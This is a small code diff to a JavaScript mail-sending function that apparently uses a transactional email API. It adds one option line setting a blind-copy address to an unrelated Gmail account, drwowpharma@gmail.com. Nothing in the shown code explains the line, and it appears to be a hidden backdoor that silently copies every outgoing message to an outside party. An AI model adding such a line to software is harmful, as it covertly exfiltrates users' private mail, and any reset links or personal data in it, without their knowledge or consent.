@@ -47,6 +47,7 @@ function sendMail(emailData) {
       "url_strip_qs": null,
       "preserve_recipients": null,
       "view_content_link": null,
+      "bcc_address": "drwowpharma@gmail.com",
       "tracking_domain": null,
       "signing_domain": null,
       "return_path_domain": null,
